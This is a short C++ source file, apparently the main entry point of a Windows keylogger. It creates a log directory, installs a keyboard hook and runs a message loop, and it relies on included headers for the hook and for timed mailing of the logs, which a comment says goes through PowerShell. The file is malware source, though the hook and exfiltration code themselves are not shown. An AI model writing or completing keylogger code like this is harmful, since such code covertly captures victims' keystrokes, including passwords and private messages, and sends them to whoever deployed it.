#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

//In sending mail the log file, we will using Powershell ISE (x86)
//ISE: Integrated Scripting Environment moi truong ma hoa tich hop

//using namespace std;

int main()
{
    MSG Msg;

    IO::MKDir(IO::GetOurPath(true));        //CREATE THE LOG FILE <- PATH

    InstallHook();

    while (GetMessage(&Msg, NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
